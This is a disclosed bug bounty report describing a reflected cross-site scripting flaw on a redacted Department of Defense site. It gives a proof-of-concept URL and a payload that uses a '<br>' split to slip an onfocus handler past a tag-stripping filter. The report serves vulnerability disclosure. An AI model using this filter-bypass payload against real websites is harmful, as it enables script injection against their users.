# XSS on https://████/ via ███████ parameter

## Report Details
- **Report ID**: 1251868
- **URL**: https://hackerone.com/reports/1251868
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-07-05T15:57:36.075Z
- **Disclosed**: 2022-04-07T19:55:49.404Z

## Reporter
- **Username**: homosec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
PoC
```
https://████████/██████=█████████%22%20o%3Cbr%3Enfocus=confirm(1337)%20autofocus%20tabindex=1%20xss
```

Payload
```
 o<br>nfocus=confirm(1337) autofocus tabindex=1 xss
```

WAF bypass
Tags are removed from user input. It is allowed to bypass WAF.
███

## Impact

XSS on https://████████/

## System Host(s)
███

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Go to
```
https://█████/██████=████%22%20o%3Cbr%3Enfocus=confirm(1337)%20autofocus%20tabindex=1%20xss
```

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
